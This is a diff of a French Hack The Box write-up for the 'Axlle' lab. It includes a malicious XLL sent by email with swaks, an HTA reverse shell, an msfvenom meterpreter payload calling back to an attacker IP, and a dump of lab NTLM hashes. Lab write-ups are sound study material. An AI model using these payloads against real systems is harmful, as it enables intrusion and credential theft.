@@ -37,7 +37,7 @@ https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks
 
 Copiez les fichiers et modifiez-les, et remplacez Powershell#3 (Base64) par le shell de rebond
 
-`
+```c
 #include <windows.h>
 
 __declspec(dllexport) void __cdecl xlAutoOpen(void);
@@ -60,26 +60,21 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     return TRUE;
 }
 
-`
+```
 
 Utilisez gcc pour compiler des fichiers C en fichiers xll
-`
-x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exploit.c -luser32
 
-`
+`x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exploit.c -luser32`
+
 Envoyez le fichier xll au compte administrateur et attendez l'exécution
-`
-swaks --to accounts@axlle.htb --from test@test.test --header "Subject: 111" --body "give me a shell"  --attach shell.xll
 
-`
+`swaks --to accounts@axlle.htb --from test@test.test --header "Subject: 111" --body "give me a shell"  --attach shell.xll`
 
 ![nmap](./images/nc.png)
 
 L'hôte ayant ouvert le service de messagerie, accédez à l'annuaire pour trouver des informations.
-`
-cd "C:\Program Files (x86)\hmailserver\"
 
-`
+`cd "C:\Program Files (x86)\hmailserver\"`
 Dans C:\Program Files (x86)\hmailserver\data\axlle.htb\dallon.matrix\2F>, il y a un fichier eml, affichez-le en tapant *
 
 ![nmap](./images/file.png)
@@ -87,7 +82,7 @@ Dans C:\Program Files (x86)\hmailserver\data\axlle.htb\dallon.matrix\2F>, il y a
 ### reverse shell hta
 Un script d'automatisation est utilisé pour tester l'URL, en plaçant l'URL dans le dossier `C:\inetpub\testing`. Le fichier `priv.url` contient l'emplacement du script HTA, dans lequel vous devez ajouter un code de reverse shell.
 
-`
+```java
 #priv.url
 [InternetShortcut]
 URL=C:\Users\Public\Downloads\shell.hta
@@ -105,7 +100,7 @@ URL=C:\Users\Public\Downloads\shell.hta
 </body>
 </html>
 
-`
+```
 
 ![nmap](./images/9200.png)
 
@@ -132,24 +127,20 @@ Vous avez trouvé un fichier README.md sous C:\App Development\kbfiltr, vérifie
 ![nmap](./images/rewrite.jpg)
 
 Il est à noter que le fichier `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` sera exécuté en tant que fichier système. Commencez par vérifier les autorisations de ce dossier.
-`
-icacls "C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64"
 
-`
+`icacls "C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64"`
+
 ![nmap](./images/icacls.jpg)
 
 On remarque que `Everyone` possède les permissions d'exécution et de lecture. Remplacez-le par votre propre payload.
 
-`
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=9500 -f exe -o standalonerunner.exe
-
-`
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=9500 -f exe -o standalonerunner.exe`
 
 ![nmap](./images/shell.jpg)
 
 Exporter le hash NTLM, ici le hash de Jacob correspond à la valeur avant la modification du mot de passe.
 
-`
+```hash
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:6322b5b9f9daecb0fefd594fa6fafb6a:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6d92f4784b46504cf3bedbc702ac03fe:::
@@ -172,5 +163,4 @@ calum.scott:1124:aad3b435b51404eeaad3b435b51404ee:35a376bb58095b4a559fbceccdb013
 dallon.matrix:1125:aad3b435b51404eeaad3b435b51404ee:124a4a99bf67ca4b04e2266f967daa64:::
 baz.humphries:1126:aad3b435b51404eeaad3b435b51404ee:ecfc37e6e4797f9ae97b61f0265c0561:::
 MAINFRAME$:1000:aad3b435b51404eeaad3b435b51404ee:011a082f7649082b7fe7521c2ae2bb2a:::
-
-`
+```
